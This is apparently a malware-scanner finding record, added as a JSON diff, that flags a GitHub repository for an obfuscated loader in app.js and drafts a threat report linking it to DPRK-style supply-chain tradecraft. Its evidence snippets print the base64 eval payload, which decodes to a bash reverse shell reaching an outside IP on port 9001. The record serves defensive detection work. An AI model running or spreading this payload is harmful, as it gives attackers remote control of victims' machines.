@@ -1,0 +1,82 @@
+{
+  "finding": {
+    "key": "repository:buxomapp/barfas-server",
+    "kind": "repository",
+    "family": "",
+    "id": "buxomapp/barfas-server",
+    "url": "https://github.com/buxomapp/barfas-server",
+    "registry": "github",
+    "owner": "buxomapp",
+    "status": "confirmed",
+    "confidence": "review",
+    "score": 9,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "obfuscation/eval-decoded; obfuscation/base64-buffer",
+    "evidence_locations": "app.js:19; app.js:20",
+    "c2_hosts": "",
+    "iocs": "app.js",
+    "matched_signatures": "",
+    "reasons": "repository under owner buxomapp of a known-malicious repo | Tier-2 confirmed (bash score 8)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260722T080021Z",
+    "last_seen": "hunt-20260722T080021Z",
+    "evidence_file": "repositories/buxomapp_barfas-server.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "app.js",
+      "line": 19,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "decoded payload -> require/module hijack, child_process/exec | eval(Buffer.from(\"c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDg"
+    },
+    {
+      "file": "app.js",
+      "line": 20,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "decoded payload -> require/module hijack, child_process/exec | eval(Buffer.from(\"c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDg"
+    },
+    {
+      "file": "app.js",
+      "line": 19,
+      "category": "obfuscation",
+      "rule": "base64-buffer",
+      "snippet": "eval(Buffer.from(\"c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksID"
+    },
+    {
+      "file": "app.js",
+      "line": 20,
+      "category": "obfuscation",
+      "rule": "base64-buffer",
+      "snippet": "eval(Buffer.from(\"c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksID"
+    }
+  ],
+  "commit_sha": "a75250228a68b2d830460778879aaac0b49aadeb",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/buxomapp/barfas-server",
+    "version_info": "all",
+    "threat_description": "Obfuscated loader. Payload in app.js.\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: app.js\n- app.js:19: decodes a hidden blob and executes it at load time (obfuscated loader) (+1 more)\n- app.js:19: hides code in an encoded blob that is decoded and run (+1 more)",
+    "publisher": "buxomapp",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/buxomapp/barfas-server/blob/a75250228a68b2d830460778879aaac0b49aadeb/app.js#L19\nhttps://github.com/buxomapp/barfas-server/blob/a75250228a68b2d830460778879aaac0b49aadeb/app.js#L20",
+    "verified_iocs": "app.js",
+    "contributors": [],
+    "first_seen": "2026-07-22T08:00:21Z",
+    "last_seen": "2026-07-22T08:00:21Z"
+  }
+}
